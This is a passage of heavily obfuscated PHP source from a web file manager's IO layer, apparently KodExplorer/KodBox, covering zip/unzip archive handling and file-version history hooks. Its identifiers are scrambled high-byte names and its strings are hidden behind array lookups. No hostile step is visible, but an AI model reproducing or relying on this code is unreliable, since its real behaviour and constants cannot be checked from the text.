$ˆ¸íßÏ‘); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $âÙ¶ÄñÙ = $GLOBALS[$˜¨¦Ï¡Û[1250]]; self::$driverListUser = array_to_keyvalue($âÙ¶ÄñÙ, $˜¨¦Ï¡Û[475]); } $÷ç¶ÒÚÚ = self::$driverListUser[$‰íàÖ™¹]; break; case KodIO::KOD_SHARE_LINK: $÷ç¶ÒÚÚ = array($˜¨¦Ï¡Û[1248] => $˜¨¦Ï¡Û[1251], $˜¨¦Ï¡Û[6] => $ˆ¸íßÏ‘); $Ë‰¼…Ÿ = Action($˜¨¦Ï¡Û[1252])->sharePathInfo($ˆ¸íßÏ‘[$˜¨¦Ï¡Û[87]]); $Îš¤ªÀí = $Ë‰¼…Ÿ[$˜¨¦Ï¡Û[193]]; if (!$Ë‰¼…Ÿ[$˜¨¦Ï¡Û[193]]) { $“İæ×Œ = Model($˜¨¦Ï¡Û[664])->getInfo($Ë‰¼…Ÿ[$˜¨¦Ï¡Û[665]]); $Îš¤ªÀí = KodIO::clear($“İæ×Œ[$˜¨¦Ï¡Û[1253]] . $ˆ¸íßÏ‘[$˜¨¦Ï¡Û[1246]]); $ˆ¸íßÏ‘[$˜¨¦Ï¡Û[560]] = $“İæ×Œ; $ˆ¸íßÏ‘[$˜¨¦Ï¡Û[1228]] = $Îš¤ªÀí; $÷ç¶ÒÚÚ = array($˜¨¦Ï¡Û[1248] => $˜¨¦Ï¡Û[1254], $˜¨¦Ï¡Û[6] => $ˆ¸íßÏ‘); } break; case KodIO::KOD_SHARE_ITEM: $÷ç¶ÒÚÚ = array($˜¨¦Ï¡Û[1248] => $˜¨¦Ï¡Û[1255], $˜¨¦Ï¡Û[6] => $ˆ¸íßÏ‘); $“İæ×Œ = Model($˜¨¦Ï¡Û[664])->getInfo($ˆ¸íßÏ‘[$˜¨¦Ï¡Û[475]]); if ($“İæ×Œ[$˜¨¦Ï¡Û[193]] == $˜¨¦Ï¡Û[228]) { $Îš¤ªÀí = KodIO::clear($“İæ×Œ[$˜¨¦Ï¡Û[1253]] . $ˆ¸íßÏ‘[$˜¨¦Ï¡Û[1246]]); $ˆ¸íßÏ‘[$˜¨¦Ï¡Û[560]] = $“İæ×Œ; $ˆ¸íßÏ‘[$˜¨¦Ï¡Û[1228]] = $Îš¤ªÀí; $÷ç¶ÒÚÚ = array($˜¨¦Ï¡Û[1248] => $˜¨¦Ï¡Û[1256], $˜¨¦Ï¡Û[6] => $ˆ¸íßÏ‘); } else { if (!$Îš¤ªÀí) { $Îš¤ªÀí = $“İæ×Œ[$˜¨¦Ï¡Û[193]]; } } break; default: $Îš¤ªÀí = $ˆ¸íßÏ‘[$˜¨¦Ï¡Û[87]]; $÷ç¶ÒÚÚ = array($˜¨¦Ï¡Û[1248] => $˜¨¦Ï¡Û[1257]); break; } $úá³—è½ = $ˆ¸íßÏ‘[$˜¨¦Ï¡Û[87]]; if (!isset(self::$driverCache[$úá³—è½])) { $ã·Æ×Ùğ = strtolower($÷ç¶ÒÚÚ[$˜¨¦Ï¡Û[98]]); $î–×®¸Ó = $GLOBALS[$˜¨¦Ï¡Û[6]][$˜¨¦Ï¡Û[92]][$˜¨¦Ï¡Û[892]]; $î©±ö›ş = $˜¨¦Ï¡Û[77] . (isset($î–×®¸Ó[$ã·Æ×Ùğ]) ? $î–×®¸Ó[$ã·Æ×Ùğ] : ucfirst($ã·Æ×Ùğ)); if (!class_exists($î©±ö›ş)) { show_json("{$î©±ö›ş}\40\156\x6f\164\40\145\170\x69\x73\x74\x73\41", !1); } $ˆ¤óÏÏä = isset($÷ç¶ÒÚÚ[$˜¨¦Ï¡Û[6]]) ? $÷ç¶ÒÚÚ[$˜¨¦Ï¡Û[6]] : !1; self::$driverCache[$úá³—è½] = new $î©±ö›ş($ˆ¤óÏÏä); } $°œĞõ‘Ù = self::$driverCache[$úá³—è½]; $°œĞõ‘Ù->pathDriver = $ğïßßä ; $°œĞõ‘Ù->pathBase = $˜¨¦Ï¡Û[12]; if (isset($÷ç¶ÒÚÚ[$˜¨¦Ï¡Û[6]][$˜¨¦Ï¡Û[1258]])) { $°œĞõ‘Ù->pathBase = rtrim($÷ç¶ÒÚÚ[$˜¨¦Ï¡Û[6]][$˜¨¦Ï¡Û[1258]], $˜¨¦Ï¡Û[8]) . $˜¨¦Ï¡Û[8]; $Îš¤ªÀí = $°œĞõ‘Ù->pathBase . ltrim($Îš¤ªÀí, $˜¨¦Ï¡Û[8]); } $Îš¤ªÀí = $°œĞõ‘Ù->getPath($Îš¤ªÀí); if (isset($ˆ¸íßÏ‘[$˜¨¦Ï¡Û[1228]])) { $Îš¤ªÀí = $ˆ¸íßÏ‘[$˜¨¦Ï¡Û[1228]]; } $°œĞõ‘Ù->path = $Îš¤ªÀí; return $°œĞõ‘Ù; } public static function errorTips($şº´ÖÙ… = false) { $»İ°æçƒ =& $_SERVER[Ş­ğŠìÒ]; static $»®óÓÔŒ = array(); $–í†¡²× = 1000; if ($şº´ÖÙ… === -1) { return $»®óÓÔŒ ? $»®óÓÔŒ[count($»®óÓÔŒ) - 1] : $»İ°æçƒ[12]; } if ($şº´ÖÙ… === !1) { return implode($»İ°æçƒ[262], $»®óÓÔŒ); } if (count($»®óÓÔŒ) >= $–í†¡²×) { $»®óÓÔŒ = array_slice($»®óÓÔŒ, $–í†¡²× * 0.5, $–í†¡²×); } $»®óÓÔŒ[] = $şº´ÖÙ…; write_log($»İ°æçƒ[176] . ACTION . $»İ°æçƒ[1259] . $şº´ÖÙ…, $»İ°æçƒ[1260]); } public static function getLastError($Š¬ğ•Ä… = '') { $Ÿ¬™’î = self::errorTips(-1); return $Ÿ¬™’î ? $Ÿ¬™’î : $Š¬ğ•Ä…; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $›á¹ÍÄÔ; if ($›á¹ÍÄÔ) { return $›á¹ÍÄÔ; } $íƒ¯¨™° = IO::init($_SERVER[Ş­ğŠìÒ][8]); return $íƒ¯¨™°; } private static function iconvSystem($”ÔÏ•—Ç) { return self::local()->iconvSystem($”ÔÏ•—Ç); } private static function iconvApp($şó´¥úÚ) { return self::local()->iconvApp($şó´¥úÚ); } public static function zipFolder($Î³¡·, $êòˆ†§á = "\x7a\151\x70", $Ù¿¢¾š = '', $‡³£ëó½ = REPEAT_RENAME) { $ÅúÚú»ø =& $_SERVER[Ş­ğŠìÒ]; $‡ç£ô»‡ = IO::listPath($Î³¡·); if (!$‡ç£ô»‡) { return !1; } $‡ç£ô»‡ = array_merge($‡ç£ô»‡[$ÅúÚú»ø[85]], $‡ç£ô»‡[$ÅúÚú»ø[86]]); return self::zip($‡ç£ô»‡, $êòˆ†§á, $Ù¿¢¾š, $‡³£ëó½); } public static function zip($‘Åª‡²¾, $» ›êş = "\x7a\151\x70", $òÁÀå© = '', $ËŒÓÅ°‚ = REPEAT_RENAME) { $ç·ú¿Ÿ¾ =& $_SERVER[Ş­ğŠìÒ]; if (is_string($‘Åª‡²¾) && $‘Åª‡²¾) { $‘Åª‡²¾ = array(array($ç·ú¿Ÿ¾[87] => $‘Åª‡²¾)); } $¾½ ®ÎÓ = self::init($‘Åª‡²¾[0][$ç·ú¿Ÿ¾[87]]); $œ­íËé  = self::info($‘Åª‡²¾[0][$ç·ú¿Ÿ¾[87]]); $ºæ­çÙá = $ç·ú¿Ÿ¾[12]; $ªô¤»²ş = $ç·ú¿Ÿ¾[12]; $™Çˆîª¢ = $ç·ú¿Ÿ¾[12]; if ($òÁÀå© && substr($òÁÀå©, -1, 1) != $ç·ú¿Ÿ¾[8]) { $ªô¤»²ş = get_path_father($òÁÀå©); $™Çˆîª¢ = get_path_this($òÁÀå©); } else { $ªô¤»²ş = self::pathFather($œ­íËé [$ç·ú¿Ÿ¾[87]]); $™Çˆîª¢ = $œ­íËé [$ç·ú¿Ÿ¾[32]] . $ç·ú¿Ÿ¾[10] . $» ›êş; if (count($‘Åª‡²¾) > 1) { $âÊ…Õó‡ = IO::info($ªô¤»²ş); $™Çˆîª¢ = $âÊ…Õó‡[$ç·ú¿Ÿ¾[32]] . $ç·ú¿Ÿ¾[10] . $» ›êş; } if ($òÁÀå©) { $ªô¤»²ş = $òÁÀå©; } } if ($¾½ ®ÎÓ->getType() == $ç·ú¿Ÿ¾[109]) { $Çéú‰î = self::init($ªô¤»²ş); $‘áÜ‡íå = $Çéú‰î->getType() == $ç·ú¿Ÿ¾[109] ? $ªô¤»²ş : get_path_father($¾½ ®ÎÓ->path); $‘áÜ‡íå = rtrim($‘áÜ‡íå, $ç·ú¿Ÿ¾[8]) . $ç·ú¿Ÿ¾[8]; mk_dir($‘áÜ‡íå); } else { $ºæ­çÙá = TEMP_FILES . $ç·ú¿Ÿ¾[1261] . time() . rand_string(8) . $ç·ú¿Ÿ¾[8]; mk_dir($ºæ­çÙá); file_put_contents($ºæ­çÙá . $ç·ú¿Ÿ¾[1262], $ç·ú¿Ÿ¾[12]); $‘áÜ‡íå = $ºæ­çÙá; } $Ò°¡ï = IO::info($‘áÜ‡íå); if (!$Ò°¡ï || !$Ò°¡ï[$ç·ú¿Ÿ¾[233]]) { show_json(LNG($ç·ú¿Ÿ¾[1263]), !1); } $´ö¡¿² = self::zipFileList($‘Åª‡²¾, $ºæ­çÙá); foreach ($´ö¡¿² as $ƒ‡ğş–ó => $…öşŒİ‹) { $´ö¡¿²[$ƒ‡ğş–ó] = self::iconvSystem($…öşŒİ‹); } $—ºµàÃ = get_filename_auto($‘áÜ‡íå . $™Çˆîª¢, $ç·ú¿Ÿ¾[12], $ËŒÓÅ°‚); KodArchive::create(self::iconvSystem($—ºµàÃ), $´ö¡¿²); if (!IO::exist($—ºµàÃ)) { if ($ºæ­çÙá) { del_dir($ºæ­çÙá); } write_log($ç·ú¿Ÿ¾[1264] . $—ºµàÃ, $ç·ú¿Ÿ¾[389]); show_json(LNG($ç·ú¿Ÿ¾[1265]), !1); } if (!$ºæ­çÙá) { return $—ºµàÃ; } $Úö–ûº = self::move($—ºµàÃ, $ªô¤»²ş, $ËŒÓÅ°‚); if ($ºæ­çÙá) { del_dir($ºæ­çÙá); } if (!$—ºµàÃ) { write_log($ç·ú¿Ÿ¾[1266] . $—ºµàÃ . $ç·ú¿Ÿ¾[1267] . $ªô¤»²ş, $ç·ú¿Ÿ¾[389]); show_json(LNG($ç·ú¿Ÿ¾[1265]), !1); } return $Úö–ûº; } public static function unzip($Ó«Ù®³, $§¢ÑÍ—Î, $¢¯›´é = "\55\61", $²öîˆ™î = "\162\x65\160\154\141\x63\x65") { $ùº¤µı =& $_SERVER[Ş­ğŠìÒ]; $şˆÚ±Ò– = parent::info($Ó«Ù®³); if (!$şˆÚ±Ò–) { show_json(LNG($ùº¤µı[1268]), !1); } $Šı„Øõá = IO::infoFullSimple($§¢ÑÍ—Î); if (!$Šı„Øõá) { $§¢ÑÍ—Î = IO::mkdir($§¢ÑÍ—Î); } if (isset($Šı„Øõá[$ùº¤µı[193]]) && trim($Šı„Øõá[$ùº¤µı[87]], $ùº¤µı[8]) != trim($§¢ÑÍ—Î, $ùº¤µı[8])) { $Ş‡±ÀÎê = KodIO::make($Šı„Øõá[$ùº¤µı[192]]); $Ôâ®üé¢ = IO::fileNameAuto($Ş‡±ÀÎê, $Šı„Øõá[$ùº¤µı[32]], REPEAT_RENAME_FOLDER, !0); $§¢ÑÍ—Î = IO::mkdir($Ş‡±ÀÎê . $Ôâ®üé¢); } $¢¯›´é = $¢¯›´é && $¢¯›´é != $ùº¤µı[1269] ? @json_decode($¢¯›´é, !0) : -1; $ö®Ğ”“ = self::unzipPart($Ó«Ù®³, $¢¯›´é); if (!$ö®Ğ”“ || !IO::exist($ö®Ğ”“[$ùº¤µı[230]])) { show_json(LNG($ùº¤µı[108]), !1); } $éÈó×‡á = $ö®Ğ”“[$ùº¤µı[1270]][count($ö®Ğ”“[$ùº¤µı[1270]]) - 1]; if ($éÈó×‡á[$ùº¤µı[1271]] == -1 || substr($éÈó×‡á[$ùº¤µı[32]], -1, 1) == $ùº¤µı[8]) { $±ùÙÜı = $ö®Ğ”“[$ùº¤µı[1272]] . rand_string(10) . $ùº¤µı[8]; mk_dir($±ùÙÜı); $à¥öÆ˜– = count($ö®Ğ”“[$ùº¤µı[1270]]) == 1 ? IO::ext($Ó«Ù®³) : get_path_ext($ö®Ğ”“[$ùº¤µı[230]]); $äÈ¤×œ = KodArchive::extract(self::iconvSystem($ö®Ğ”“[$ùº¤µı[230]]), $±ùÙÜı, $éÈó×‡á[$ùº¤µı[1271]], $Ôâ®üé¢, $à¥öÆ˜–); self::unzipErrorCheck($äÈ¤×œ, array($ùº¤µı[1273], $Ó«Ù®³, $à¥öÆ˜–, $§¢ÑÍ—Î, $ö®Ğ”“)); Hook::trigger($ùº¤µı[1274], $±ùÙÜı); recursion_dir($±ùÙÜı, $î»Õ–Ãå, $¸…½ø»ë, 0); $–•²”®€ = array_merge($î»Õ–Ãå, $¸…½ø»ë); $ì†áÙ„“ = array(); foreach ($–•²”®€ as $„ãÂ˜ü) { $Åı­Â“à = IO::move(self::iconvApp($„ãÂ˜ü), $§¢ÑÍ—Î, $²öîˆ™î); if ($Åı­Â“à) { $ì†áÙ„“[] = $Åı­Â“à; } } del_dir($±ùÙÜı); } else { $Åı­Â“à = IO::move($ö®Ğ”“[$ùº¤µı[230]], $§¢ÑÍ—Î, $²öîˆ™î, get_path_this($éÈó×‡á[$ùº¤µı[32]])); if ($Åı­Â“à) { $ì†áÙ„“[] = $Åı­Â“à; } } return $ì†áÙ„“ ? $ì†áÙ„“ : !1; } public static function unzipList($ ½‰å¡£) { $»üÈ¥È =& $_SERVER[Ş­ğŠìÒ]; $ÚüúãÇ = isset($ ½‰å¡£[$»üÈ¥È[1275]]) ? $ ½‰å¡£[$»üÈ¥È[1275]] : !1; $ÙÊÉú¸İ = isset($ ½‰å¡£[$»üÈ¥È[1271]]) ? @json_decode($ ½‰å¡£[$»üÈ¥È[1271]], !0) : -1; $íßâ = self::unzipPart($ ½‰å¡£[$»üÈ¥È[87]], $ÙÊÉú¸İ); if (!$íßâ || !IO::exist($íßâ[$»üÈ¥È[230]])) { show_json(LNG($»üÈ¥È[108]), !1); } $ÈüÇ‡ˆ§ = $íßâ[$»üÈ¥È[1270]][count($íßâ[$»üÈ¥È[1270]]) - 1]; $•ÎİÀÙ = in_array(IO::ext($íßâ[$»üÈ¥È[230]]), array($»üÈ¥È[389], $»üÈ¥È[1276], $»üÈ¥È[1277], $»üÈ¥È[1278], $»üÈ¥È[1279], $»üÈ¥È[1280])); if (!$ÚüúãÇ && ($ÈüÇ‡ˆ§[$»üÈ¥È[1271]] == -1 || $•ÎİÀÙ)) { $¦Ôïµ·¸ = $íßâ[$»üÈ¥È[1272]] . get_path_this($íßâ[$»üÈ¥È[230]]) . $»üÈ¥È[1281]; if (!IO::exist($¦Ôïµ·¸)) { $Ú·Á¨¡í = $ÈüÇ‡ˆ§[$»üÈ¥È[1271]] == -1 ? get_path_ext(IO::pathThis($ ½‰å¡£[$»üÈ¥È[87]])) : get_path_ext($íßâ[$»üÈ¥È[230]]); $¡†Î€½Ş = KodArchive::listContent(self::iconvSystem($íßâ[$»üÈ¥È[230]]), !0, $Ú·Á¨¡í); self::unzipErrorCheck($¡†Î€½Ş, array($»üÈ¥È[1282], $ ½‰å¡£, $íßâ)); @file_put_contents($¦Ôïµ·¸, json_encode($¡†Î€½Ş[$»üÈ¥È[1283]])); } return @json_decode(IO::getContent($¦Ôïµ·¸), !0); } IO::fileOut($íßâ[$»üÈ¥È[230]], $ÚüúãÇ, get_path_this($ÈüÇ‡ˆ§[$»üÈ¥È[32]])); die; } private static function zipFileList($×Ä¥ş§‡, $Ù¢˜İ¿· = false) { $Ö•Öœ‰÷ =& $_SERVER[Ş­ğŠìÒ]; $Õ¼‹­‚¶ = array(); foreach ($×Ä¥ş§‡ as $öÔ¨ˆÓ) { $©óÊ» = $öÔ¨ˆÓ[$Ö•Öœ‰÷[87]]; if ($Ù¢˜İ¿·) { $©óÊ» = self::copy($öÔ¨ˆÓ[$Ö•Öœ‰÷[87]], $Ù¢˜İ¿·, $Ö•Öœ‰÷[885]); } else { $•×„Ô = self::init($öÔ¨ˆÓ[$Ö•Öœ‰÷[87]]); if ($•×„Ô->getType() == $Ö•Öœ‰÷[109]) { $©óÊ» = $•×„Ô->path; } } if ($©óÊ» && self::local()->exist($©óÊ»)) { $Õ¼‹­‚¶[$öÔ¨ˆÓ[$Ö•Öœ‰÷[87]]] = $©óÊ»; } } if (!empty($Õ¼‹­‚¶)) { return array_values($Õ¼‹­‚¶); } show_json(LNG($Ö•Öœ‰÷[1242]), !1); } private static function localFilePath($›É·ì—ä) { $ù½’ÌÕø =& $_SERVER[Ş­ğŠìÒ]; $ÚÂ›œÁ— = KodIO::parse($›É·ì—ä); if ($ÚÂ›œÁ—[$ù½’ÌÕø[33]] == KodIO::KOD_SOURCE) { $÷¹¤Ôóü = Model($ù½’ÌÕø[891])->fileInfoGet(KodIO::sourceID($›É·ì—ä)); if (!$÷¹¤Ôóü[$ù½’ÌÕø[87]]) { show_json($ù½’ÌÕø[1284], !1); } $›É·ì—ä = $÷¹¤Ôóü[$ù½’ÌÕø[87]]; } $¢Ñ¾ƒ„£ = self::init($›É·ì—ä); if ($¢Ñ¾ƒ„£->pathParse[$ù½’ÌÕø[1228]]) { $›É·ì—ä = $¢Ñ¾ƒ„£->pathParse[$ù½’ÌÕø[1228]]; $¢Ñ¾ƒ„£ = self::init($›É·ì—ä); } $Œ½Ø¿’ã = $¢Ñ¾ƒ„£->getType(); if ($Œ½Ø¿’ã == $ù½’ÌÕø[109] || $Œ½Ø¿’ã == $ù½’ÌÕø[1285]) { if (!$¢Ñ¾ƒ„£->exist($¢Ñ¾ƒ„£->path)) { show_json(LNG($ù½’ÌÕø[108]), !1); } return $¢Ñ¾ƒ„£->path; } return !1; } public static function unzipPart($ÙÀ·Î ¥, $„¦Ùœ×® = -1) { $–¹ËºóÚ =& $_SERVER[Ş­ğŠìÒ]; $×„ùÕã¸ = IO::pathThis($ÙÀ·Î ¥); if (!$„¦Ùœ×® || $„¦Ùœ×® == -1) { $¨€êáÒØ = array(array($–¹ËºóÚ[32] => $×„ùÕã¸, $–¹ËºóÚ[1271] => -1)); $¨€êáÒØ[0][$–¹ËºóÚ[1286]] = $¨€êáÒØ[0][$–¹ËºóÚ[32]]; } else { if (is_array($„¦Ùœ×®)) { $¨€êáÒØ = $„¦Ùœ×®; $Ø¡‰áãÇ = count($¨€êáÒØ) - 1; for ($Ü›‘ûñÜ = 0; $Ü›‘ûñÜ <= $Ø¡‰áãÇ; $Ü›‘ûñÜ++) { $èÉ†™« = $¨€êáÒØ[$Ü›‘ûñÜ]; $ãÛ†ºáØ = get_path_this($èÉ†™«[$–¹ËºóÚ[32]]) . (checkExtSafe($èÉ†™«[$–¹ËºóÚ[32]]) ? $–¹ËºóÚ[12] : $–¹ËºóÚ[1287]); $¨€êáÒØ[$Ü›‘ûñÜ][$–¹ËºóÚ[1286]] = $–¹ËºóÚ[1288] . intval($èÉ†™«[$–¹ËºóÚ[1271]]) . $–¹ËºóÚ[462] . $ãÛ†ºáØ; if ($Ü›‘ûñÜ == 0) { continue; } $¨€êáÒØ[$Ü›‘ûñÜ][$–¹ËºóÚ[1286]] = $¨€êáÒØ[$Ü›‘ûñÜ - 1][$–¹ËºóÚ[1286]] . $–¹ËºóÚ[1289] . $¨€êáÒØ[$Ü›‘ûñÜ][$–¹ËºóÚ[1286]]; } } } if (!is_array($¨€êáÒØ) || count($¨€êáÒØ) == 0) { return !1; } $âÙîğŒ = $¨€êáÒØ[count($¨€êáÒØ) - 1]; if (!IO::exist($ÙÀ·Î ¥)) { return !1; } $šÊ”çÑã = TEMP_FILES . $–¹ËºóÚ[1290] . kodIO::hashPathSafe($ÙÀ·Î ¥) . $–¹ËºóÚ[8]; $óïü¡· = $šÊ”çÑã . $âÙîğŒ[$–¹ËºóÚ[1286]]; mk_dir($šÊ”çÑã); file_put_contents(TEMP_FILES . $–¹ËºóÚ[1262], $–¹ËºóÚ[12]); if (IO::exist($óïü¡·)) { return array($–¹ËºóÚ[230] => $óïü¡·, $–¹ËºóÚ[1270] => $¨€êáÒØ, $–¹ËºóÚ[1272] => $šÊ”çÑã); } $»ù†…µä = self::localFilePath($ÙÀ·Î ¥); if (!$»ù†…µä) { $»ù†…µä = $šÊ”çÑã . $–¹ËºóÚ[1291]; if (!IO::exist($»ù†…µä)) { self::copy($ÙÀ·Î ¥, $šÊ”çÑã, !1, get_path_this($»ù†…µä)); } } if (!$»ù†…µä || !IO::exist($»ù†…µä)) { return !1; } if ($âÙîğŒ[$–¹ËºóÚ[1271]] == -1) { return array($–¹ËºóÚ[230] => $»ù†…µä, $–¹ËºóÚ[1270] => $¨€êáÒØ, $–¹ËºóÚ[1272] => $šÊ”çÑã); } $ÃŸ›ºÅ£ = $»ù†…µä; foreach ($¨€êáÒØ as $Ü›‘ûñÜ => $èÉ†™«) { if (!$èÉ†™« || $èÉ†™«[$–¹ËºóÚ[1271]] == $–¹ËºóÚ[1269]) { break; } if (substr($èÉ†™«[$–¹ËºóÚ[32]], -1, 1) == $–¹ËºóÚ[8]) { break; } $‚Ûå©ª = in_array(get_path_ext($èÉ†™«[$–¹ËºóÚ[1286]]), array($–¹ËºóÚ[389], $–¹ËºóÚ[1276], $–¹ËºóÚ[1277], $–¹ËºóÚ[1278], $–¹ËºóÚ[1279], $–¹ËºóÚ[1280])); $”–«úï“ = $Ü›‘ûñÜ == count($¨€êáÒØ) - 1 && $‚Ûå©ª; $ºú×ã = $šÊ”çÑã . $èÉ†™«[$–¹ËºóÚ[1286]]; $ŸŒîŸŸğ = $šÊ”çÑã . get_path_this($èÉ†™«[$–¹ËºóÚ[32]]); if (IO::exist($ºú×ã)) { $ÃŸ›ºÅ£ = $ºú×ã; continue; } $Ÿ½û‚š× = $Ü›‘ûñÜ == 0 ? get_path_ext($×„ùÕã¸) : get_path_ext($ÃŸ›ºÅ£); $ê¤´˜Ã‰ = KodArchive::extract(self::iconvSystem($ÃŸ›ºÅ£), $šÊ”çÑã, $èÉ†™«[$–¹ËºóÚ[1271]], $‰½ÓŒÈ, $Ÿ½û‚š×); self::unzipErrorCheck($ê¤´˜Ã‰, array($–¹ËºóÚ[1292], $ÙÀ·Î ¥, $¨€êáÒØ, $èÉ†™«, $ºú×ã)); if (IO::exist($ŸŒîŸŸğ)) { IO::rename($ŸŒîŸŸğ, get_path_this($ºú×ã)); } $ÃŸ›ºÅ£ = $ºú×ã; } $óïü¡· = $ÃŸ›ºÅ£; return array($–¹ËºóÚ[230] => $ÃŸ›ºÅ£, $–¹ËºóÚ[1270] => $¨€êáÒØ, $–¹ËºóÚ[1272] => $šÊ”çÑã); } private static function unzipErrorCheck($Ø’–­²´, $ê¿¾¤á = false) { $İŒÌïàÌ =& $_SERVER[Ş­ğŠìÒ]; if ($Ø’–­²´[$İŒÌïàÌ[1293]]) { return !0; } write_log(array($İŒÌïàÌ[1294], $Ø’–­²´, $ê¿¾¤á), $İŒÌïàÌ[1295]); show_json($İŒÌïàÌ[1296] . json_encode($Ø’–­²´[$İŒÌïàÌ[1283]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $™ôõœ£¿ =& $_SERVER[Ş­ğŠìÒ]; $Ã˜¦É’ = $GLOBALS[$™ôõœ£¿[6]][$™ôõœ£¿[92]]; if ($Ã˜¦É’[$™ôõœ£¿[1297]] != 1) { return; } if ($Ã˜¦É’[$™ôõœ£¿[1298]] <= 0) { return; } if (isset($_REQUEST[$™ôõœ£¿[1299]]) && $_REQUEST[$™ôõœ£¿[1299]] == $™ôõœ£¿[91]) { return; } Hook::bind($™ôõœ£¿[1300], $™ôõœ£¿[1301]); Hook::bind($™ôõœ£¿[1302], $™ôõœ£¿[1303]); Hook::bind($™ôõœ£¿[1304], $™ôõœ£¿[1305]); Hook::bind($™ôõœ£¿[1306], $™ôõœ£¿[1307]); Hook::bind($™ôõœ£¿[1308], $™ôõœ£¿[1309]); Hook::bind($™ôõœ£¿[1310], $™ôõœ£¿[1311]); } public static function eventBeforeUpload($’ãø°è‹) { if ($’ãø°è‹[3] && $’ãø°è‹[3] != REPEAT_REPLACE) { return; } $òª®üúö = self::parsePath($’ãø°è‹[0]); if (!$òª®üúö) { return; } self::add($òª®üúö); } public static function eventBeforeEdit($ìÍáñÅë) { $‹—ÏËŞ‘ = self::parsePath($ìÍáñÅë[0]); if (!$‹—ÏËŞ‘) { return; } self::add($‹—ÏËŞ‘); } public static function eventBeforeCopyFile($¦çĞ±Ö¶, $¾Ù•ÀçÛ, $â½õ¿áè, $ÙÆª§Ê¼, $º°·¯÷, $ª”ÉÜ¾•) { $¥©ßîŞ‰ =& $_SERVER[Ş­ğŠìÒ]; if (isset($â½õ¿áè->_data[$¥©ßîŞ‰[1232]]) && $â½õ¿áè->_data[$¥©ßîŞ‰[1232]]) { return; } $¾ Ì”Ì± = $â½õ¿áè->getPathOuter($ÙÆª§Ê¼); $±ßŒË³« = self::parsePath($¾ Ì”Ì±); if (!$±ßŒË³«) { return; } self::add($±ßŒË³«); } public static function eventBeforeRename($É€—‡Ù£) { $è´¬ıİÎ =& $_SERVER[Ş­ğŠìÒ]; $³¸Ô—° = self::parsePath($É€—‡Ù£[0]); if (!$³¸Ô—°) { return; } $Ç•ÜŠÃ· = self::checkInHistory($³¸Ô—°); if (!$Ç•ÜŠÃ·) { return; } if ($Ç•ÜŠÃ·[$è´¬ıİÎ[33]] == $è´¬ıİÎ[230]) { $ŸÅ“©çò = self::listData($³¸Ô—°); if ($ŸÅ“©çò && $ŸÅ“©çò[$è´¬ıİÎ[445]]) { self::moveHistory($³¸Ô—°, $É€—‡Ù£[1]); } } else { IO::rename($Ç•ÜŠÃ·[$è´¬ıİÎ[87]], $É€—‡Ù£[1]); } } public static function eventBeforeMove($şÄìÜ‰§) { $Õƒ£‘Ì± =& $_SERVER[Ş­ğŠìÒ]; $¦íè¹¯© = self::parsePath($şÄìÜ‰§[0]); if (!$¦íè¹¯©) { return; } $‰ÜùÎùŸ = self::parsePath($şÄìÜ‰§[1]); if (!$‰ÜùÎùŸ) { return; } $÷Ÿ¨ùÓ = $şÄìÜ‰§[3]; $¼¿ØîƒÊ = self::checkInHistory($¦íè¹¯©); if (!$¼¿ØîƒÊ) { return; } $êÙ©‘³ª = self::pathHistory($‰ÜùÎùŸ); if ($¼¿ØîƒÊ[$Õƒ£‘Ì±[33]] == $Õƒ£‘Ì±[230]) { $ÂËÉ¡§ = self::listData($¦íè¹¯©); $‚ÚãäîØ = rtrim($‰ÜùÎùŸ, $Õƒ£‘Ì±[8]) . $Õƒ£‘Ì±[8] . ($÷Ÿ¨ùÓ ? $÷Ÿ¨ùÓ : get_path_this($¦íè¹¯©)); $›óÇÃ÷æ = self::listData($‚ÚãäîØ); if ($ÂËÉ¡§ && $ÂËÉ¡§[$Õƒ£‘Ì±[445]] && $›óÇÃ÷æ && $›óÇÃ÷æ[$Õƒ£‘Ì±[445]]) { return self::clear($¦íè¹¯©); } if ($ÂËÉ¡§ && $ÂËÉ¡§[$Õƒ£‘Ì±[445]]) { self::moveHistory($¦íè¹¯©, $÷Ÿ¨ùÓ, $êÙ©‘³ª); } } else { IO::move($¼¿ØîƒÊ[$Õƒ£‘Ì±[87]], $êÙ©‘³ª, !1, $÷Ÿ¨ùÓ); self::clearEmptyFolder(IO::pathFather($¼¿ØîƒÊ[$Õƒ£‘Ì±[87]])); } } public static function eventAfterRemove($¼é­ãæÈ, $ŸÁ—è€…) { $İ­ô´Ô¾ =& $_SERVER[Ş­ğŠìÒ]; if (!$ŸÁ—è€…) { return; } $ßøÍèûÀ = self::parsePath($¼é­ãæÈ[0]); if (!$ßøÍèûÀ) { return; } $ªµ÷¥¦µ = self::checkInHistory($ßøÍèûÀ); if (!$ªµ÷¥¦µ) { return; } if ($ªµ÷¥¦µ[$İ­ô´Ô¾[33]] == $İ­ô´Ô¾[230]) { $í…»ª¦ = self::listData($ßøÍèûÀ, !1); if ($í…»ª¦ && $í…»ª¦[$İ­ô´Ô¾[445]]) { self::clear($ßøÍèûÀ, !1); } } else { IO::remove($ªµ÷¥¦µ[$İ­ô´Ô¾[87]]); self::clearEmptyFolder(IO::pathFather($ªµ÷¥¦µ[$İ­ô´Ô¾[87]])); } } private static function checkInHistory($Êæ»ÛéŞ) { $²µŸÇ£ê = self::pathHistory($Êæ»ÛéŞ); if (!IO::exist($²µŸÇ£ê)) { $²µŸÇ£ê .= $_SERVER[Ş­ğŠìÒ][1312]; } return IO::exist($²µŸÇ£ê) ? IO::info($²µŸÇ£ê) : !1; } private static function parsePath($§åß¬—) { $ ÛõğÁî =& $_SERVER[Ş­ğŠìÒ]; if (!$§åß¬—) { return !1; } if (isset($GLOBALS[$ ÛõğÁî[1313]]) && $GLOBALS[$ ÛõğÁî[1313]]) { return; } $ÊõÂ = KodIO::parse($§åß¬—); $±€”œÑé = $ÊõÂ[$ ÛõğÁî[33]]; $Õºªù¾Ã = !$±€”œÑé || $±€”œÑé == KodIO::KOD_IO || $±€”œÑé == KodIO::KOD_SHARE_ITEM; if (!$Õºªù¾Ã || !$ÊõÂ[$ ÛõğÁî[1314]]) { return !1; } if (substr($§åß¬—, 0, strlen(DATA_PATH . $ ÛõğÁî[1315])) == DATA_PATH . $ ÛõğÁî[1315]) { return !1; } if ($±€”œÑé == KodIO::KOD_SHARE_ITEM) { $€˜¨Ìéı = IO::init($§åß¬—); if ($€˜¨Ìéı->pathParse[$ ÛõğÁî[1228]]) { return 